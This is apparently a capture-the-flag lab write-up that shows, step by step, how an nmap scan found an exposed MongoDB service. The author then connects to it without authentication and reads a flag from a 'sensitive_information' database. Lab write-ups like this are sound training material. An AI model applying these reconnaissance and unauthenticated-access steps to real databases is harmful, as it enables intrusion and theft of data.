Starting nmap:

```shell
-p- : This flag scans for all TCP ports ranging from 0-65535
-sV : Attempts to determine the version of the service running on a port
--min-rate : This is used to specify the minimum number of packets that Nmap should
send per second; it speeds up the scan as the number goes higher

nmap -sV --min-rate=1000 -p- -oN nmap.txt $SERVERIP                                                                               main 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 20:27 CEST
Nmap scan report for 10.129.139.63
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.93 seconds


```

Download mongodb client:

```shell
curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz                                                                     main 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 82.7M  100 82.7M    0     0  29.2M      0  0:00:02  0:00:02 --:--:-- 29.2M


tar xvf mongodb-linux-x86_64-3.4.7.tgz                                                                                                      main 
mongodb-linux-x86_64-3.4.7/README
mongodb-linux-x86_64-3.4.7/THIRD-PARTY-NOTICES
mongodb-linux-x86_64-3.4.7/MPL-2
mongodb-linux-x86_64-3.4.7/GNU-AGPL-3.0
mongodb-linux-x86_64-3.4.7/bin/mongodump
mongodb-linux-x86_64-3.4.7/bin/mongorestore
mongodb-linux-x86_64-3.4.7/bin/mongoexport
mongodb-linux-x86_64-3.4.7/bin/mongoimport
mongodb-linux-x86_64-3.4.7/bin/mongostat
mongodb-linux-x86_64-3.4.7/bin/mongotop
mongodb-linux-x86_64-3.4.7/bin/bsondump
mongodb-linux-x86_64-3.4.7/bin/mongofiles
mongodb-linux-x86_64-3.4.7/bin/mongooplog
mongodb-linux-x86_64-3.4.7/bin/mongoreplay
mongodb-linux-x86_64-3.4.7/bin/mongoperf
mongodb-linux-x86_64-3.4.7/bin/mongod
mongodb-linux-x86_64-3.4.7/bin/mongos
mongodb-linux-x86_64-3.4.7/bin/mongo


cd mongodb-linux-x86_64-3.4.7/bin    

./mongo mongodb://${SERVERIP}:27017                                                                                   1   main 
MongoDB shell version v3.4.7
connecting to: mongodb://10.129.139.63:27017
MongoDB server version: 3.6.8
WARNING: shell and server versions do not match
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
Server has startup warnings: 
2022-10-04T18:20:18.620+0000 I STORAGE  [initandlisten] 
2022-10-04T18:20:18.620+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2022-10-04T18:20:18.620+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2022-10-04T18:20:21.790+0000 I CONTROL  [initandlisten] 
2022-10-04T18:20:21.790+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-10-04T18:20:21.790+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-10-04T18:20:21.790+0000 I CONTROL  [initandlisten] 

```

> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use sensitive_information;
switched to db sensitive_information

> show collections;
flag
> db.flag.find().pretty();
{
	"_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
	"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
> 

